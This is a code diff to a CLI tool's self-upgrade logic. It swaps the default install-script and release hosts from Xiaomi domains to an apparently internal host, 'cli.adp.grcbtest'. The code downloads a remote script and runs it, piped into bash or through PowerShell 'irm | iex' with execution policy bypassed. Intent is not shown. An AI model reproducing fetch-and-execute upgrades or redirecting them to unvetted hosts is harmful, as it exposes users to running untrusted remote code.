@@ -151,7 +151,7 @@ export const layer: Layer.Layer<Service, never, HttpClient.HttpClient | ChildPro
           if (process.platform === "win32") {
             return yield* upgradeCurlWindows(target)
           }
-          const response = yield* httpOk.execute(HttpClientRequest.get(process.env.MIMOCODE_INSTALL_SCRIPT_URL ?? "https://mimo.xiaomi.com/install"))
+          const response = yield* httpOk.execute(HttpClientRequest.get(process.env.MIMOCODE_INSTALL_SCRIPT_URL ?? "https://cli.adp.grcbtest/install"))
           const body = yield* response.text
           const bodyBytes = new TextEncoder().encode(body)
           const proc = ChildProcess.make("bash", [], {
@@ -177,7 +177,7 @@ export const layer: Layer.Layer<Service, never, HttpClient.HttpClient | ChildPro
         const stageDir = path.join(os.tmpdir(), `mimocode_upgrade_${pid}`)
 
         // Download new version to staging dir (reuses install.ps1 logic)
-        const installScriptUrl = process.env.MIMOCODE_INSTALL_SCRIPT_URL ?? "https://mimo.xiaomi.com/install.ps1"
+        const installScriptUrl = process.env.MIMOCODE_INSTALL_SCRIPT_URL ?? "https://cli.adp.grcbtest/install.ps1"
         const downloadResult = yield* run(
           ["powershell.exe", "-NoProfile", "-NonInteractive", "-ep", "Bypass", "-c", "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; irm $env:INSTALL_SCRIPT_URL | iex"],
           { env: { MIMOCODE_INSTALL_DIR: stageDir, VERSION: target, INSTALL_SCRIPT_URL: installScriptUrl } },
@@ -260,7 +260,7 @@ export const layer: Layer.Layer<Service, never, HttpClient.HttpClient | ChildPro
           // Resolve the latest version from FDS, matching the source the install
           // script downloads from (fast in mainland China). Override base via
           // MIMO_FDS_BASE to mirror the install script.
-          const base = (process.env.MIMO_FDS_BASE || "https://mimocode.cnbj1.mi-fds.com/mimocode/mimocode").replace(
+          const base = (process.env.MIMO_FDS_BASE || "https://cli.adp.grcbtest").replace(
             /\/+$/,
             "",
           )
